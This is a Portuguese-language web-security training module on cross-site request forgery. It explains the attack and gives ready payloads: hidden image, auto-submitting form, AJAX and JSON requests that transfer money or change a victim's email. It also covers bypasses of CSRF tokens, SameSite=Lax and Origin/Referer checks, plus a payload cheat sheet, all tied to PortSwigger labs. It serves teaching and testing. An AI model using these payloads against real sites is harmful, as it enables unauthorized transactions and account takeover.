# 🔄 05. CSRF — Cross-Site Request Forgery

> O navegador do usuário é forçado a enviar uma requisição que ele não autorizou. E funciona porque o servidor confia no cookie.

<div align="center">

| ⏱️ Tempo | 📊 Nível | 🔧 Ferramentas |
|:--------:|:--------:|:--------------:|
| 40min | ⭐⭐ Intermediário | `Burp Repeater, curl` |

</div>

---

## 🎓 Por que isso importa?

CSRF (Cross-Site Request Forgery) faz com que o navegador de uma vítima **envie uma requisição automaticamente** para um site onde ela está logada. O servidor aceita porque o cookie de sessão é enviado junto.

**Analogia:** Imagine que você tem um cheque em branco assinado. Se alguém preencher o valor e depositar, o banco paga — porque a assinatura é sua.

**Impacto real:**
- **Transferências bancárias** sem autorização
- **Alteração de email/senha** de conta
- **Compra de itens** sem o usuário saber
- **Privilege escalation** via admin actions

---

## 📋 Pré-requisitos

| Conhecimento | Necessário? | Onde aprender |
|:-------------|:-----------:|:-------------:|
| HTTP basics (cookies, same-origin) | Sim | Módulo 00 |
| Burp Suite | Sim | Arquivo 01 |

---

## 🎯 Quando testar CSRF

- Quando existem **ações sensíveis** (transferência, alteração de senha, exclusão)
- Quando a app **não usa token CSRF** ou usa de forma fraca
- Quando cookies **não têm SameSite**
- Para testar **bypass de proteções CSRF**

---

## 🔄 Como funciona na prática

```
┌──────────┐     ┌──────────┐     ┌──────────┐
│ Usuário  │     │ evil.com │     │ target.com│
│ (logado) │     │ (atacante)│    │ (banco)  │
└────┬─────┘     └────┬─────┘     └────┬─────┘
     │                │                │
     │  1. Visita     │                │
     │     evil.com   │                │
     │ ──────────────►│                │
     │                │                │
     │                │  2. Página evil
     │                │     contém:
     │                │     <img src="
     │                │     target.com/
     │                │     transfer?to=
     │                │     attacker&
     │                │     amount=10000
     │                │     ">
     │                │                │
     │  3. Navegador   │                │
     │     envia GET   │                │
     │     com cookie  │                │
     │ ────────────────────────────────►│
     │                │                │
     │                │  4. Servidor   │
     │                │     aceita     │
     │                │     (cookie    │
     │                │     válido)    │
     │                │                │
```

---

## 📝 Tipos de CSRF

### 1. GET-based CSRF

```html
<!-- Via imagem -->
<img src="http://target.com/transfer?to=attacker&amount=10000">

<!-- Via script -->
<script src="http://target.com/api/delete?user=123"></script>

<!-- Via link -->
<a href="http://target.com/transfer?to=attacker&amount=10000">Clique aqui</a>
```

### 2. POST-based CSRF

```html
<!-- Formulário oculto -->
<form action="http://target.com/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf-form').submit();</script>

<!-- Via AJAX -->
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://target.com/transfer", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.withCredentials = true;
xhr.send("to=attacker&amount=10000");
</script>
```

### 3. CSRF via JSON

```html
<form action="http://target.com/api/transfer" method="POST" enctype="text/plain">
  <input type="hidden" name='{"to":"attacker","amount":10000}' value="">
</form>
<script>document.forms[0].submit();</script>
```

---

## 🛡️ Proteções e Bypass

### 1. Token CSRF

```
# Servidor gera token único por sessão
# Formulário inclui: <input type="hidden" name="csrf_token" value="abc123">
# Servidor valida: se token não bate → rejeita
```

**Bypass:**
```bash
# Se token é previsível (timestamp, sequential)
# Predizer próximo token

# Se token é fixo (session fixation)
# Reutilizar token de outra sessão

# Se token só é validado no POST mas não no GET
# Converter POST para GET
```

### 2. SameSite Cookie

```
# SameSite=Strict → cookie NÃO é enviado cross-site
# SameSite=Lax → cookie é enviado apenas em GET de navegação
# SameSite=None → cookie é enviado cross-site (vulnerável!)

# Bypass de Lax:
# Usar <a href="target.com/transfer?to=attacker"> (navegação top-level GET)
```

### 3. Verificação de Origin/Referer

```
# Servidor verifica header Origin ou Referer
# Bypass: se servidor só verifica se contém target.com

# Referer: http://target.com.attacker.com/evil
# Origin: http://target.com.attacker.com
```

### 4. Custom Headers

```
# Servidor exige header customizado (X-Requested-With)
# Bypass: se CORS permite origens arbitrárias
```

---

## 📝 Exemplos Práticos

### Exemplo 1: CSRF GET Básico

```bash
# 1. Encontrar ação sensível via GET
# Ex: http://target.com/api/change-email?newemail=hacker@evil.com

# 2. Criar página maliciosa
cat > evil.html << 'EOF'
<!DOCTYPE html>
<html>
<body>
  <h1>Prêmio! Clique para ganhar!</h1>
  <img src="http://target.com/api/change-email?newemail=hacker@evil.com" style="display:none">
</body>
</html>
EOF

# 3. Servir página e esperar vítima acessar
# 4. Email da vítima é alterado automaticamente
```

### Exemplo 2: CSRF POST

```bash
# Criar formulário CSRF
cat > csrf.html << 'EOF'
<!DOCTYPE html>
<html>
<body>
  <form action="http://target.com/api/transfer" method="POST" id="f">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
  </form>
  <script>document.getElementById('f').submit();</script>
</body>
</html>
EOF
```

### Exemplo 3: Testar Ausência de Token

```bash
# 1. Capturar request legítimo via Burp
# 2. Verificar se tem token CSRF
# 3. Se NÃO tem → testar CSRF:

curl -X POST http://target.com/api/transfer \
  -H "Cookie: session=VICTIM_SESSION" \
  -d "to=attacker&amount=10000"

# Se retornar 200 OK → CSRF confirmado
```

### Exemplo 4: Bypass SameSite=Lax

```bash
# Se cookie é SameSite=Lax:
# Top-level navigation GET envia cookie

# Criar link que redireciona:
<a href="https://target.com/api/change-email?newemail=hacker@evil.com">
  Clique para ver seu prêmio
</a>

# Quando vítima clica → navegação top-level GET → cookie enviado
```

---

## 📋 Cheat Sheet Rápido

### Payloads CSRF

```html
<!-- GET -->
<img src="http://target.com/action?param=value">

<!-- POST -->
<form action="http://target.com/action" method="POST">
  <input type="hidden" name="param" value="value">
</form>
<script>document.forms[0].submit();</script>

<!-- AJAX -->
<script>
fetch('http://target.com/api/action', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({param: 'value'})
});
</script>
```

### Headers de Proteção

```
SameSite=Strict/Lax/None    → cookie policy
CSRF-Token                  → token único por sessão
Origin/Referer              → verificação de origem
Custom Header               → X-Requested-With
```

---

## 🧪 Labs Práticos

| # | Plataforma | Lab | Tópicos | Tempo |
|---|:----------:|:----|:--------|:-----:|
| 1 | PortSwigger | [CSRF](https://portswigger.net/web-security/csrf) | CSRF básico | 15min |
| 2 | PortSwigger | [CSRF with no defenses](https://portswigger.net/web-security/csrf/lab-with-no-defenses) | Sem proteção | 10min |
| 3 | PortSwigger | [CSRF where token is not tied to session](https://portswigger.net/web-security/csrf/lab-csrf-with-token-not-tied-to-user-session) | Token fixo | 20min |

---

## 📚 Referências

- [PortSwigger — CSRF](https://portswigger.net/web-security/csrf)
- [OWASP — CSRF](https://owasp.org/www-community/attacks/csrf)
- [HackTricks — CSRF](https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery)

---

## ✅ Validação

Após este módulo, você deve conseguir:

- [ ] Identificar ações sensíveis sem proteção CSRF
- [ ] Criar payloads CSRF (GET e POST)
- [ ] Testar ausência de token CSRF
- [ ] Bypass de SameSite cookie
- [ ] Bypass de verificação Origin/Referer
- [ ] Completar os labs PortSwigger de CSRF
